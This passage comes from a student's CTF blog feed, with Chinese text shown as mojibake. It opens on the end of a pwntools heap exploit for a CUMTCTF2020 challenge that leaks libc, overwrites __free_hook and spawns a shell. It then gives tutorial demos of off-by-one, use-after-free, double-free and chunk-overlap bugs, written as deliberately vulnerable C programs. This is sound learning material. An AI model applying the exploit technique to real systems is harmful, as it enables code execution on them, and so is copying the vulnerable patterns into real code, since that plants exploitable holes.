sh.recv()</span><br><span class="line"> sh.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"2"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"3"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"><span class="comment">#step1: æ„é€ å‡º0x200çš„pre_size</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):<span class="comment">#ç”¨åˆ°10ä¸ªå—</span></span><br><span class="line"> add(<span class="number">0x80</span>,<span class="string">'a'</span> * <span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):<span class="comment">#å…­ä¸ªè¿›å…¥tcahce</span></span><br><span class="line"> delete(i)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#é˜²æ­¢top_chunkåˆå¹¶</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">9</span>):</span><br><span class="line"> delete(i)<span class="comment">#pre_sizeåˆ†åˆ«ä¸º0x0,0x100,0x200 ï¼ˆè¿™é‡Œåˆå¹¶äº†ï¼‰</span></span><br><span class="line"><span class="comment">#åˆ°è¿™é‡Œå…¨éƒ¨éƒ½freeæ‰äº†ï¼Œ7ä¸ªåœ¨tcache,3ä¸ªåœ¨unsorted_bin</span></span><br><span class="line"><span class="comment">#step2: æŠŠ0x100æ”¾å…¥tcache å¹¶ç”±å—7è¿›å…¥unsorted_binæä¾›libc</span></span><br><span class="line"><span class="comment">#å¦å¤–æ³¨æ„ä¸€ä¸‹idx</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#å æ»¡tcache è¿™é‡Œæ˜¯å€’ç€çš„ 6,5,4,3,2,1ï¼Œx,x,x,0</span></span><br><span class="line"> add(<span class="number">0x8</span>,p64(i))</span><br><span class="line">add(<span class="number">0x8</span>,p64(<span class="number">7</span>)) <span class="comment">#åˆ‡åˆ†unsorted_bin</span></span><br><span class="line">add(<span class="number">0x8</span>,p64(<span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x8</span>,p64(<span class="number">9</span>)) <span class="comment">#10ä¸ªåˆ†é…å®Œæ¯•</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>): <span class="comment">#è¿™é‡Œidx=6æ²¡æœ‰é‡Šæ”¾ ä¹Ÿå°±æ˜¯æœ€ä¸Šé¢çš„</span></span><br><span class="line"> delete(i)</span><br><span class="line">delete(<span class="number">8</span>) <span class="comment">#è¿›å…¥tcache å¸¦ç€0x100</span></span><br><span class="line">delete(<span class="number">7</span>) <span class="comment">#è¿›å…¥unsorted_bin æä¾›Libc </span></span><br><span class="line">add(<span class="number">0xf8</span>, p64(<span class="number">0</span>)) <span class="comment">#è¿™æ¬¡åˆ†é…çš„æ˜¯idx=8çš„Bå—ï¼Œ å°†Cå—çš„inuseä½ç»™æ¸…äº†</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#å¡«æ»¡tcache</span></span><br><span class="line">delete(<span class="number">9</span>) <span class="comment">#ä¿ƒä½¿å—åˆå¹¶ï¼Œä½†å—8è¿˜åœ¨ä½¿ç”¨</span></span><br><span class="line"><span class="comment">#step3: leak libc</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line"> add(<span class="number">0x8</span>, p64(i))</span><br><span class="line">add(<span class="number">0x8</span> ,p64(<span class="number">7</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">log.success((hex(libc_base)))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">target = libc.symbols[<span class="string">"__free_hook"</span>] + libc_base</span><br><span class="line">log.success(hex(target))</span><br><span class="line">sys_addr = libc.symbols[<span class="string">"system"</span>] + libc_base</span><br><span class="line">one_addr = libc_base + <span class="number">0x4f432</span> <span class="comment">#0x4f2c5 </span></span><br><span class="line">add(<span class="number">0x10</span>, p64(target))</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p64(one_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åé¢å‡ ä¸ªå †é¢˜æœ‰ä¸€ä¸ªä¸Šæ¬¡æ–°ç”Ÿèµ›çš„åŸé¢˜ï¼Œä½†å°±æ˜¯åšä¸å‡ºæ¥</p><p>å †çš„ä¸œè¥¿è¿˜æ˜¯ä¸å¤ªç†Ÿæ‚‰ï¼Œæˆ‘tcl</p><p>é©¬ä¸Šè€ƒè¯•äº†ï¼Œå…ˆå»å¤ä¹ äº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CUMTCTF2020å²æœ«èµ›&quot;&gt;&lt;a href=&quot;#CUMTCTF2020å²æœ«èµ›&quot; class=&quot;headerlink&quot; title=&quot;CUMTCTF2020å²æœ«èµ›&quot;&gt;&lt;/a&gt;CUMTCTF2020å²æœ«èµ›&lt;/h1&gt;&lt;p&gt;å­¦é•¿ä»¬å¯å¤ªæäº†ï¼Œæ¯”èµ›æœ€åå‚ç›´ä¸Šåˆ†å¯å¤ªç§€äº†&lt;/</summary>
      
    
    
    
    <category term="wp" scheme="https://pz1o.top/categories/wp/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
    <category term="wp" scheme="https://pz1o.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>å †æ¼æ´åŠå…¶åˆ©ç”¨</title>
    <link href="https://pz1o.top/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/"/>
    <id>https://pz1o.top/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/</id>
    <published>2020-12-22T13:17:06.000Z</published>
    <updated>2021-02-06T07:06:55.326Z</updated>
    
    <content type="html"><![CDATA[<p>å †åŸºç¡€å’Œå †æ¼æ´è¿˜æ˜¯åˆ†å¼€æ¯”è¾ƒå¥½</p><p>è¿™æ ·çœ‹ç€ä¹Ÿæ¯”è¾ƒæ•´é½</p><h1 id="å †æ¼æ´"><a href="#å †æ¼æ´" class="headerlink" title="å †æ¼æ´"></a>å †æ¼æ´</h1><h2 id="0x01-Off-By-One"><a href="#0x01-Off-By-One" class="headerlink" title="0x01 Off By One"></a>0x01 Off By One</h2><h3 id="1-æ¦‚å¿µ"><a href="#1-æ¦‚å¿µ" class="headerlink" title="1.æ¦‚å¿µ"></a>1.æ¦‚å¿µ</h3><p>off-by-one æ˜¯æŒ‡å•å­—èŠ‚ç¼“å†²åŒºæº¢å‡ºï¼Œè¿™ç§æ¼æ´çš„äº§ç”Ÿå¾€å¾€ä¸è¾¹ç•ŒéªŒè¯ä¸ä¸¥å’Œå­—ç¬¦ä¸²æ“ä½œæœ‰å…³ï¼Œå½“ç„¶ä¹Ÿä¸æ’é™¤å†™å…¥çš„ size æ­£å¥½å°±åªå¤šäº†ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µã€‚</p><h3 id="2-åˆ©ç”¨æ€è·¯"><a href="#2-åˆ©ç”¨æ€è·¯" class="headerlink" title="2.åˆ©ç”¨æ€è·¯"></a>2.åˆ©ç”¨æ€è·¯</h3><p>(1) æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶ä»»æ„å­—èŠ‚ï¼šé€šè¿‡ä¿®æ”¹å¤§å°é€ æˆå—ç»“æ„ä¹‹é—´å‡ºç°é‡å ï¼Œä»è€Œæ³„éœ²å…¶ä»–å—æ•°æ®ï¼Œæˆ–æ˜¯è¦†ç›–å…¶ä»–å—æ•°æ®ã€‚</p><p>(2) æº¢å‡ºå­—èŠ‚ä¸º NULL å­—èŠ‚ï¼šæº¢å‡ºçš„ä¸€ä¸ªå­—èŠ‚æ°å¥½è¦†ç›–ä¸‹ä¸€å †å—çš„sizeåŸŸçš„æœ€ä½ä½ï¼Œå°†PREV_INUSEä½ç½®0ï¼Œè¿™æ ·å‰å—ä¼šè¢«è®¤ä¸ºæ˜¯ free å—ã€‚è¿™æ—¶å¯ä»¥é€‰æ‹©ä½¿ç”¨ unlink æ–¹æ³•è¿›è¡Œå¤„ç†(åé¢å°†è¯¦ç»†ä»‹ç»)ï¼Œè¿™æ—¶ prev_size åŸŸå°±ä¼šå¯ç”¨ï¼Œå°±å¯ä»¥ä¼ªé€  prev_size ï¼Œä»è€Œé€ æˆå—ä¹‹é—´å‘ç”Ÿé‡å ã€‚</p><h3 id="3-æ¼”ç¤º"><a href="#3-æ¼”ç¤º" class="headerlink" title="3.æ¼”ç¤º"></a>3.æ¼”ç¤º</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">40</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input"</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);<span class="comment">//æ–­ç‚¹</span></span><br><span class="line">    gets(<span class="built_in">buffer</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="built_in">buffer</span>)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,<span class="built_in">buffer</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªç¨‹åºçš„é—®é¢˜åœ¨äºstrlen åœ¨è®¡ç®—é•¿åº¦çš„æ—¶å€™ä¸ä¼šæŠŠç»“æŸç¬¦ â€˜\x00â€™ è®¡ç®—åœ¨å†…ï¼Œä½†strcpy åœ¨æ‹·è´çš„æ—¶å€™ä¼šæŠŠ â€˜\x00â€™ ä¹Ÿç®—ä¸Šï¼Œæ‰€ä»¥å°±ä¼šé€ æˆ off by oneã€‚</p><p>æˆ‘ä»¬å…ˆæ¥è°ƒè¯•ä¸€ä¸‹</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219141904042.png" alt="image-20201219141904042"></p><p>ç›´æ¥çœ‹å †æƒ…å†µ åˆ†é…24å­—èŠ‚ä¸Šé¢ä¸ºä»€ä¹ˆå †sizeä¸º0x21ä¹Ÿå°±æ˜¯33å­—èŠ‚ è¿™ä¸ªå¯ä»¥çœ‹ä¸Šé¢çš„</p><p>å› ä¸ºå®ƒä¼šæŠŠä¸‹é¢ä¸€ä¸ªpre_sizeå ç”¨</p><p>è¾“å…¥24ä¸ªA</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219142302977.png" alt="image-20201219142302977"></p><p>å¯ä»¥å¾ˆç›´è§‚çš„çœ‹åˆ°ç¡®å®æ˜¯æº¢å‡ºäº†ä¸€ä¸ªå­—èŠ‚</p></blockquote><h2 id="0x02-Use-After-Free"><a href="#0x02-Use-After-Free" class="headerlink" title="0x02 Use After Free"></a>0x02 Use After Free</h2><h3 id="1-æ¦‚å¿µ-1"><a href="#1-æ¦‚å¿µ-1" class="headerlink" title="1.æ¦‚å¿µ"></a>1.æ¦‚å¿µ</h3><p>Use After Free(UAF)å³é‡Šæ”¾åä½¿ç”¨æ¼æ´ã€‚è‹¥å †æŒ‡é’ˆåœ¨é‡Šæ”¾åæœªç½®ç©ºï¼Œå½¢æˆæ‚¬æŒ‚æŒ‡é’ˆï¼Œå½“ä¸‹æ¬¡è®¿é—®è¯¥æŒ‡é’ˆæ—¶ï¼Œä¾ç„¶èƒ½å¤Ÿè®¿é—®åŸæŒ‡é’ˆæ‰€æŒ‡å‘çš„å †å†…å®¹ï¼Œå½¢æˆæ¼æ´ã€‚</p><h3 id="2-åˆ©ç”¨æ¡ä»¶"><a href="#2-åˆ©ç”¨æ¡ä»¶" class="headerlink" title="2.åˆ©ç”¨æ¡ä»¶"></a>2.åˆ©ç”¨æ¡ä»¶</h3><ul><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL ï¼Œç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œæ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆ<strong>ç¨‹åºå¾ˆæœ‰å¯èƒ½å¯ä»¥æ­£å¸¸è¿è½¬</strong>ã€‚</li><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULLï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œ<strong>å°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜</strong>ã€‚</li></ul><h3 id="3-æ¼”ç¤º-1"><a href="#3-æ¼”ç¤º-1" class="headerlink" title="3.æ¼”ç¤º"></a>3.æ¼”ç¤º</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*func_ptr)</span><span class="params">(<span class="keyword">char</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys1</span><span class="params">(<span class="keyword">char</span> command[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">system(command);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">echo</span><span class="params">(<span class="keyword">char</span> content[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,content);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    func_ptr *p1=(func_ptr*)<span class="built_in">malloc</span>(<span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));<span class="comment">//ç”³è¯·äº†4ä¸ªintå¤§å°çš„å†…å­˜</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);<span class="comment">//å› ä¸ºå‰2ä¸ªä¹Ÿå°±æ˜¯0x10æ˜¯ç”¨æ¥ç®¡ç†chunkçš„</span></span><br><span class="line">    p1[<span class="number">2</span>]=echo;<span class="comment">//æ‰€ä»¥ä»ç¬¬ä¸‰ä¸ªå¼€å§‹</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"hello world\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1); <span class="comment">//åœ¨è¿™é‡Œfreeäº†p1,ä½†å¹¶æœªå°†p1ç½®ç©º,å¯¼è‡´åç»­å¯ä»¥å†ä½¿ç”¨p1æŒ‡é’ˆ</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"hello again\n"</span>); <span class="comment">//p1æŒ‡é’ˆæœªè¢«ç½®ç©º,è™½ç„¶freeäº†,ä½†ä»å¯ä½¿ç”¨.</span></span><br><span class="line">    func_ptr *p2=(func_ptr*)<span class="built_in">malloc</span>(<span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="comment">//freeä¸€å—å†…å­˜å,å†æ¬¡ç”³è¯·åŒæ ·å¤§å°çš„æŒ‡é’ˆä¼šæŠŠåˆšåˆšé‡Šæ”¾çš„å†…å­˜åˆ†é…å‡ºæ¥</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);<span class="comment">//p2ä¸p1æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸ºåŒä¸€åœ°å€</span></span><br><span class="line">    p2[<span class="number">2</span>]=sys1; <span class="comment">//åœ¨è¿™é‡Œå°†p1æŒ‡é’ˆé‡Œé¢ä¿å­˜çš„echoå‡½æ•°æŒ‡é’ˆè¦†ç›–æˆä¸ºäº†sys1æŒ‡é’ˆ.</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªp1å’Œp2çš„åœ°å€æ˜¯ç›¸åŒçš„</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219145625345.png" alt="image-20201219145625345"></p></blockquote><h2 id="0x03-Double-Free"><a href="#0x03-Double-Free" class="headerlink" title="0x03 Double Free"></a>0x03 Double Free</h2><h3 id="1-æ¦‚å¿µ-2"><a href="#1-æ¦‚å¿µ-2" class="headerlink" title="1.æ¦‚å¿µ"></a>1.æ¦‚å¿µ</h3><p>Double Freeæ˜¯UAFè¾ƒä¸ºç‰¹æ®Šçš„ä¸€ç§</p><h3 id="2-æ¼”ç¤º"><a href="#2-æ¼”ç¤º" class="headerlink" title="2.æ¼”ç¤º"></a>2.æ¼”ç¤º</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(b, <span class="string">"BBBBBBBB"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">"CCCCCCCC"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(9) %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(9) %p points to %s\n"</span>, b, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(9) %p points to %s\n"</span>, c, c);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then freeing another one %p.\n"</span>, b);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p again.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *d = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *e = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *f = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(d, <span class="string">"DDDDDDDD"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4st malloc(9) %p points to %s the first time\n"</span>, d, d);</span><br><span class="line">    <span class="built_in">strcpy</span>(e, <span class="string">"EEEEEEEE"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"5nd malloc(9) %p points to %s\n"</span>, e, e);</span><br><span class="line">    <span class="built_in">strcpy</span>(f, <span class="string">"FFFFFFFF"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"6rd malloc(9) %p points to %s the second time\n"</span>, f, f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219160532780.png" alt="image-20201219160532780"></p><p>ç›´æ¥æ ¹æ®è¾“å‡ºç†è§£å…¶ä¸­çš„åŸç† ä¹Ÿå°±æ˜¯æˆ‘ä¸Šé¢ç”»çš„è¿™ä¸ªå›¾</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219160630662.png" alt="image-20201219160630662"></p></blockquote><h2 id="0x04-overlap"><a href="#0x04-overlap" class="headerlink" title="0x04 overlap"></a>0x04 overlap</h2><h3 id="1-æ¦‚å¿µ-3"><a href="#1-æ¦‚å¿µ-3" class="headerlink" title="1.æ¦‚å¿µ"></a>1.æ¦‚å¿µ</h3><p>chunk extend æ˜¯å †æ¼æ´çš„ä¸€ç§å¸¸è§åˆ©ç”¨æ‰‹æ³•ï¼Œé€šè¿‡ extend å¯ä»¥å®ç° chunk overlapping çš„æ•ˆæœã€‚</p><h3 id="2-åˆ©ç”¨æ¡ä»¶-1"><a href="#2-åˆ©ç”¨æ¡ä»¶-1" class="headerlink" title="2.åˆ©ç”¨æ¡ä»¶"></a>2.åˆ©ç”¨æ¡ä»¶</h3><ul><li>ç¨‹åºä¸­å­˜åœ¨åŸºäºå †çš„æ¼æ´</li><li>æ¼æ´å¯ä»¥æ§åˆ¶ chunk header ä¸­çš„æ•°æ®</li></ul><h3 id="3-æ¼”ç¤º1ï¼ˆfastbinï¼‰"><a href="#3-æ¼”ç¤º1ï¼ˆfastbinï¼‰" class="headerlink" title="3.æ¼”ç¤º1ï¼ˆfastbinï¼‰"></a>3.æ¼”ç¤º1ï¼ˆfastbinï¼‰</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//åˆ†é…ç¬¬ä¸€ä¸ª0x10çš„chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//åˆ†é…ç¬¬äºŒä¸ª0x10çš„chunk</span></span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//æ–·é»</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// ä¿®æ”¹ç¬¬ä¸€ä¸ªå—çš„sizeåŸŸ</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// å®ç° extendï¼Œæ§åˆ¶äº†ç¬¬äºŒä¸ªå—çš„å†…å®¹</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç›´æ¥æ‰“æ–­ç‚¹</p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201219214608484.png" 